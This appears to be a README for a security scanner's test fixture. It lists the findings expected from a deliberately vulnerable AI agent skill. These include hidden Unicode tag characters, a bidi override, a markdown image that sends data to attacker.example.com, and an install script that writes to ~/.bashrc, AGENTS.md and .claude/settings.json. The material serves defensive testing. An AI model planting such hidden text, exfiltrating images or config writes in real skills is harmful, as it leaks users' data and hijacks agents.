# Vulnerable skill — expected findings

When `pruner scan examples/vulnerable-skill --without-cisco` runs, the Coroboros pack should report at minimum the following findings. Used for integration regression by `wrapper/tests/integration/test_compose_report.py`.

| Rule | File | Why |
|---|---|---|
| FC001 | `SKILL.md` | `name` is `"Helper Skill"` — contains a space, fails kebab-case. |
| FC003 | `SKILL.md` | `custom_field` at top level (must live under `metadata:`). |
| FC004 | `SKILL.md` | `metadata.version` present (Coroboros house rule forbids it). |
| FC005 | `SKILL.md` | `license: "Apache 2"` is not a valid SPDX identifier (correct: `Apache-2.0`). |
| PI-UNI-001 | `SKILL.md` | Hidden Unicode Tag block following `Hello`. |
| PI-UNI-003 | `SKILL.md` | Bidi override `‮` inside the bidi-override section. |
| PI-MDIMG-001 | `SKILL.md` | `![pixel](https://attacker.example.com/?data=X)` — markdown image with query string. |
| PI-IDFILE-001 | `scripts/install.sh` | `>> ~/.bashrc`, `>> AGENTS.md`, `cp ... .claude/settings.json`. |
| PI-PEP723-001 | `scripts/setup.py` | PEP-723 block with `dependencies = ["requests", "rich"]` — neither pinned. |

Run:

```bash
pruner scan examples/vulnerable-skill --without-cisco --format json --output /tmp/vuln.json
jq '[.findings[].id] | unique' /tmp/vuln.json
```

Expected `id` set covers at least: `FC001`, `FC003`, `FC004`, `FC005`, `PI-UNI-001`, `PI-UNI-003`, `PI-MDIMG-001`, `PI-IDFILE-001`, `PI-PEP723-001`.

PI-UNI-002 (variation selectors) and PI-UNI-004 (homoglyphs) are not tripped by this fixture; their positive fixtures live in the per-rule unit tests at `wrapper/tests/rules/`.
